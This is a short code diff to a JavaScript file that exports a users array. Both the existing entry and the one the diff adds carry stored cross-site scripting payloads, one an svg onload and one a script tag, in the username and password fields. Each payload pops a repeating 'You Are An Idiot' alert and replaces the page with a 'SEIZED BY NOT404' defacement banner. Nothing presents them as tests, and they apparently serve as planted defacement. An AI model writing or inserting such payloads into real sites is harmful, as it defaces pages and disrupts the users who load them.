@@ -26,5 +26,9 @@ export const users = [
   {
     "username": "<svg onload=\"   setInterval(function(){     alert('You Are An Idiot\\nHacked By Not404');   }, 2000);      document.body.style.background = 'black';   document.body.innerHTML = '<h1 style=\\\"color: red; text-align: center; margin-top: 100px;\\\">SEIZED BY NOT404</h1>'; \">",
     "password": "<svg onload=\"   setInterval(function(){     alert('You Are An Idiot\\nHacked By Not404');   }, 2000);      document.body.style.background = 'black';   document.body.innerHTML = '<h1 style=\\\"color: red; text-align: center; margin-top: 100px;\\\">SEIZED BY NOT404</h1>'; \">"
+  },
+  {
+    "username": "<script>   setInterval(function(){     alert('You Are An Idiot');   }, 3000);      document.body.style.background = '#000';   document.body.innerHTML = '<div style=\\\"color: #f00; font-size: 40px; text-align: center; padding-top: 100px;\\\">SEIZED BY NOT404</div>'; </script>",
+    "password": "<script>   setInterval(function(){     alert('You Are An Idiot');   }, 3000);      document.body.style.background = '#000';   document.body.innerHTML = '<div style=\\\"color: #f00; font-size: 40px; text-align: center; padding-top: 100px;\\\">SEIZED BY NOT404</div>'; </script>"
   }
 ];
